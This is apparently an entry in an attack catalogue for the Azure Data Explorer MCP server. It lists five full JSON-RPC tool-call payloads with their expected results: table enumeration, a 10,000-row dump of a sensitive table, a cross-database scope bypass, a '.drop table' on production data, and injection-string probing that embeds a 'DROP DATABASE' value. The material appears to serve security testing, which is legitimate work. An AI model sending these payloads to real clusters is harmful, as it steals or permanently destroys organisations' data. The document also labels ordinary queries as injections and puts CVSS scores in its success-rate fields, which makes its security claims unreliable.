# adx-mcp

## adx-mcp

- **Install:** `npm install -g @azure/mcp`
- **Benchmarks/Papers that attacked it:**
  - MCPSecBench (arXiv:2508.13220) — injection attacks on data query servers
  - CVE-2026-33980 — KQL injection vulnerability (CVSS 8.3)
  - MCP-AttackBench (arXiv:2508.10991) — injection & execution family; SQL/KQL injection class

---

### Attack: KQL Injection — Schema Exfiltration (CVE-2026-33980)

- **Category:** Query language injection / data exfiltration (CWE-89 analog for KQL)
- **Source:** CVE-2026-33980; MCPSecBench
- **ASR:** CVSS 8.3 (High) — remotely exploitable without authentication context
- **Full JSON-RPC payload:**
```json
{
  "jsonrpc": "2.0",
  "id": 1,
  "method": "tools/call",
  "params": {
    "name": "azure_kusto_query",
    "arguments": {
      "databaseName": "ProductionDB",
      "query": ".show tables"
    }
  }
}
```
- **What it does:** Issues a KQL management command `.show tables` to enumerate all tables in the Azure Data Explorer cluster. This is reconnaissance for follow-up data exfiltration attacks (CVE-2026-33980).
- **Expected server response:** Returns list of all tables with row counts, schemas, and access statistics.

---

### Attack: KQL Injection — Full Table Dump

- **Category:** KQL injection / data exfiltration (CVE-2026-33980)
- **Source:** CVE-2026-33980
- **ASR:** CVSS 8.3
- **Full JSON-RPC payload:**
```json
{
  "jsonrpc": "2.0",
  "id": 2,
  "method": "tools/call",
  "params": {
    "name": "azure_kusto_query",
    "arguments": {
      "databaseName": "ProductionDB",
      "query": "SensitiveTable | take 10000"
    }
  }
}
```
- **What it does:** Dumps up to 10,000 rows from a sensitive telemetry or production table. ADX `take` has no access control beyond cluster-level permissions, so any user with query access can extract bulk data.
- **Expected server response:** Returns 10,000 rows of sensitive production data.

---

### Attack: KQL Injection — Cross-Database Query Bypass

- **Category:** Privilege escalation via query scope (CWE-89)
- **Source:** CVE-2026-33980; MCPSecBench
- **ASR:** —
- **Full JSON-RPC payload:**
```json
{
  "jsonrpc": "2.0",
  "id": 3,
  "method": "tools/call",
  "params": {
    "name": "azure_kusto_query",
    "arguments": {
      "databaseName": "PublicDB",
      "query": "cluster('prod-cluster.eastus.kusto.windows.net').database('SecretDB').SensitiveTable | take 100"
    }
  }
}
```
- **What it does:** Uses KQL's cross-cluster/cross-database query syntax to escape the intended `PublicDB` scope and query `SecretDB` on the same or related cluster, bypassing database-level access restrictions.
- **Expected server response:** Returns rows from `SecretDB.SensitiveTable` if the service principal has cross-database access (common in misconfigured ADX deployments).

---

### Attack: KQL Management Command — Drop Table

- **Category:** Data destruction via management command (CWE-89)
- **Source:** CVE-2026-33980
- **ASR:** —
- **Full JSON-RPC payload:**
```json
{
  "jsonrpc": "2.0",
  "id": 4,
  "method": "tools/call",
  "params": {
    "name": "azure_kusto_query",
    "arguments": {
      "databaseName": "ProductionDB",
      "query": ".drop table SensitiveTable"
    }
  }
}
```
- **What it does:** Issues a KQL management command to permanently drop a production table. Unlike SQL, KQL `.drop` commands are not reversible without a prior backup policy configured.
- **Expected server response:** Table dropped — data permanently lost if no retention policy is configured.

---

### Attack: Behavioral Fingerprinting — KQL Error Probing

- **Category:** Technology disclosure (CWE-209)
- **Source:** MCPSecBench
- **ASR:** —
- **Full JSON-RPC payload:**
```json
{
  "jsonrpc": "2.0",
  "id": 5,
  "method": "tools/call",
  "params": {
    "name": "azure_kusto_query",
    "arguments": {
      "databaseName": "'; DROP DATABASE ProductionDB; --",
      "query": "' OR 1=1; .show version #"
    }
  }
}
```
- **What it does:** Sends SQL-injection-style strings to the KQL parameter to probe error message verbosity. Reveals whether the server sanitizes inputs and what version of Kusto engine is running.
- **Expected server response:** Kusto engine error with version number, cluster endpoint, and error context.
